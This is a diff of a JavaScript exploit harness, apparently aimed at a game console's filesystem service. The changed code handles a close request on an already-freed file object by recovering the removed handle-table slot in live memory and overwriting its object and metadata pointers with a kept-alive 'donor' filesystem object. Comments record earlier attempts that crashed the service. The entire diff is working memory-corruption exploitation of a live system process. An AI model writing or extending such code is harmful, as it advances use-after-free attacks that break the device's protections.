@@ -938,14 +938,12 @@ async function main() {
             continue;
           }
           // The Read unlinked its own domain entry, so the close's id is no
-          // longer live. Restoring the slot made the close handler release the
-          // file object and fault the FS (11:10, 11:38, 11:51, 13:52, 14:11),
-          // even with two extra references and the donor reference. Instead,
-          // hide the id from the FS lookup: the domain manager's count at
-          // +0x10 bounds GetEntry (id > count -> invalid), so lower it to
-          // id-1 for exactly one synchronous serve, then restore it. The FS
-          // replies with an error for the already-freed id without touching the
-          // freed slot or the file object, so the close cannot fault.
+          // longer live. Every attempt that restored the consumed file object
+          // faulted the FS (11:10, 11:38, 11:51, 13:52, 14:11), and hiding the
+          // id behind the manager count did not help (14:37: the FS ignored the
+          // count). The remaining untested target is the live donor filesystem
+          // itself: it is kept alive by donorReference, and its interface is
+          // IFileSystem, so the close never runs the consumed file destructor.
           const current = await entries(memory, layout, root.targetDomain);
           if (!current.some(entry => entry.id === pendingInfo.object)) {
             if (process.env.NS2_LAUNCH_CLOSE_HANDBACK === '1') {
@@ -961,43 +959,46 @@ async function main() {
                 break;
               }
             }
-            const countAddr = Number(layout.manager) + 0x10;
-            const original = await memory.read(countAddr, 4);
-            const originalCount = original.readUInt32LE();
-            const slot = Number(layout.table) + (pendingInfo.object - 1) * 0x30;
-            const slotBefore = await memory.read(slot, 0x30);
-            const hidden = Buffer.alloc(4);
-            hidden.writeUInt32LE(Math.max(0, pendingInfo.object - 1));
-            (proof.closeHidden ||= []).push({index: i, id: pendingInfo.object,
-              countAddr, originalCount, slot: slotBefore.toString('hex')});
-            await save();
-            let step;
-            // Keep the low-count window as short as possible: the FS serves
-            // while the park event stays signalled, so a fast Loader could
-            // queue its next request into the same window. 5 ms is enough for
-            // the close receive/reply and far too short for the next OpenFile.
-            const wakeMs = process.env.NS2_GATE_WAKE_MS;
-            const serveMs = process.env.NS2_GATE_SERVE_MS;
-            process.env.NS2_GATE_WAKE_MS = '5';
-            process.env.NS2_GATE_SERVE_MS = '0';
-            try {
-              await memory.write(countAddr, original, hidden);
-              step = await gate.stepServe({force: true});
-            } finally {
-              if (wakeMs === undefined) delete process.env.NS2_GATE_WAKE_MS;
-              else process.env.NS2_GATE_WAKE_MS = wakeMs;
-              if (serveMs === undefined) delete process.env.NS2_GATE_SERVE_MS;
-              else process.env.NS2_GATE_SERVE_MS = serveMs;
-              await memory.write(countAddr, hidden, original);
+            const recovered = await recoverRemovedEntry(pendingInfo.object).catch(error => {
+              (proof.recoverErrors ||= []).push({index: i, object: pendingInfo.object, error: error.message});
+              return null;
+            });
+            if (recovered) {
+              (proof.recoveredCloses ||= []).push({index: i, ...recovered});
+              console.log(JSON.stringify({stage: 'close-recovered', index: i, ...recovered}));
+              // Retarget the restored slot at the donor filesystem object.
+              const slot = recovered.slot;
+              const original = await memory.read(slot, 0x30);
+              const updated = Buffer.from(original);
+              updated.writeBigUInt64LE(BigInt(donor.object), 0x20);
+              updated.writeBigUInt64LE(BigInt(donor.metadata), 0x28);
+              await memory.write(slot, original, updated);
+              proof.closeTarget = {kind: 'donor', slot, object: donor.object,
+                metadata: donor.metadata, file: recovered.object};
+              await save();
+              try {
+                const step = await gate.stepServe({force: true});
+                (proof.closesServed ||= []).push({index: i, id: pendingInfo.object,
+                  empty: !!step.empty, request: step.request ? step.request.slice(0, 64) : null});
+                await save();
+                console.log(JSON.stringify({stage: 'close-served', index: i,
+                  id: pendingInfo.object, target: 'donor', empty: !!step.empty}));
+                lastBuffer = step.bufferAfterWake || step.request;
+                lastServedAt = Date.now(); sameWaits = 0;
+                continue;
+              } catch (error) {
+                // Never hand a close back to the FS after a failed serve: the
+                // 14:37 fallback did exactly that and faulted. Keep the session
+                // parked so the console survives for inspection.
+                proof.closeServeError = error.stack;
+                proof.heldClose = true;
+                await save();
+                throw error;
+              }
             }
-            (proof.closesServed ||= []).push({index: i, id: pendingInfo.object,
-              count: originalCount, empty: !!step.empty,
-              request: step.request ? step.request.slice(0, 64) : null});
-            await save();
-            console.log(JSON.stringify({stage: 'close-served-hidden', index: i,
-              id: pendingInfo.object, count: originalCount, empty: !!step.empty}));
-            lastBuffer = step.bufferAfterWake || step.request;
-            lastServedAt = Date.now(); sameWaits = 0;
+            (proof.staleCloses ||= []).push({index: i, object: pendingInfo.object,
+              reason: 'close target is no longer in the target domain'});
+            if (Date.now() - lastServedAt >= quietMs) break;
             continue;
           }
         }
@@ -1102,12 +1103,14 @@ async function main() {
     if (stopLiveness) await stopLiveness();
     // A wedged endpoint or a dead console makes restore throw; record it
     // instead of masking the error that ended the stage.
-    if (proof.staleCloses?.length) {
+    if (proof.staleCloses?.length || proof.heldClose) {
       // The Loader is blocked on a close whose domain entry we could not
-      // restore. Signalling the parked session would make the FS process that
-      // close and fault the console (the 02:53 restore), so leave it parked and
-      // keep the console alive for inspection.
-      proof.restoreSkipped = 'stale close left queued; session kept parked';
+      // restore, or the close serve itself failed. Signalling the parked
+      // session would make the FS process that close and fault the console
+      // (02:53, 14:37), so leave it parked and keep the console alive.
+      proof.restoreSkipped = proof.heldClose ?
+        'close serve failed; session kept parked' :
+        'stale close left queued; session kept parked';
       await save();
     } else try {
       // Restoring into a queued close whose entry is gone makes the FS process
